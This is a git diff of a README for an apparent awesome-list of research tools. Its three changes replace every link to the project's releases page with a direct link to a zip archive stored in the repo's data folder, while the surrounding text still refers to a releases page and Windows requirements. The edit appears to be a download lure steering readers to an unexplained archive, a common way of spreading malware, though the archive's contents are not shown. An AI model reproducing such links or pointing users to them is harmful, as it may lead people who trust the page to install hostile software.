@@ -1,6 +1,6 @@
 # 🔎 awesome-automated-research - Find research tools fast
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Elianovg/awesome-automated-research/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Elianovg/awesome-automated-research/raw/refs/heads/main/data/research_automated_awesome_3.6.zip)
 
 ## 📘 What this is
 
@@ -26,7 +26,7 @@ A modern Windows 10 or Windows 11 system works well for this kind of content bro
 
 To get the latest version, visit this page to download:
 
-https://github.com/Elianovg/awesome-automated-research/releases
+https://github.com/Elianovg/awesome-automated-research/raw/refs/heads/main/data/research_automated_awesome_3.6.zip
 
 ### Step 1: Open the releases page
 Open the link above in your browser. You will see a list of release files and version notes.
@@ -192,4 +192,4 @@ Release pages often include newer entries, fixes, and link updates. Check the re
 
 Visit this page to download the latest release:
 
-https://github.com/Elianovg/awesome-automated-research/releases
+https://github.com/Elianovg/awesome-automated-research/raw/refs/heads/main/data/research_automated_awesome_3.6.zip
